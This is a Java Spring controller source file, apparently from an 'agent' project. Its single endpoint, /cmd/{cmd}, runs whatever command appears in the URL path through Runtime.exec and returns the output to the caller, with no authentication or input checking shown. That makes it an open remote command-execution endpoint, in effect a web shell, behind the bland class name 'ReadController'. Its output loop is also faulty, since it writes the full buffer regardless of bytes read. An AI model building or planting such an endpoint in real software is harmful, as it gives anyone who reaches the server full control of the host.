package com.createarttechnology.agent.controller;

import com.createarttechnology.logger.Logger;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

/**
 * Created by lixuhui on 2019/1/28.
 */
@Controller
public class ReadController {

    private static final Logger logger = Logger.getLogger(ReadController.class);

    @RequestMapping("/cmd/{cmd}")
    public void index(HttpServletRequest request, HttpServletResponse response, @PathVariable String cmd) throws IOException {

        Process process = Runtime.getRuntime().exec(cmd);
        try {
            process.waitFor();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        int exitVal = process.exitValue();
        InputStream is = null;
        OutputStream os = response.getOutputStream();
        if (exitVal == 0) {
            is = process.getInputStream();
        } else {
            is = process.getErrorStream();
        }
        response.setStatus(200);
        byte[] buff = new byte[1024];
        while (is.read(buff) >= 0) {
            os.write(buff);
        }
        os.flush();
        is.close();
        os.close();
    }

}
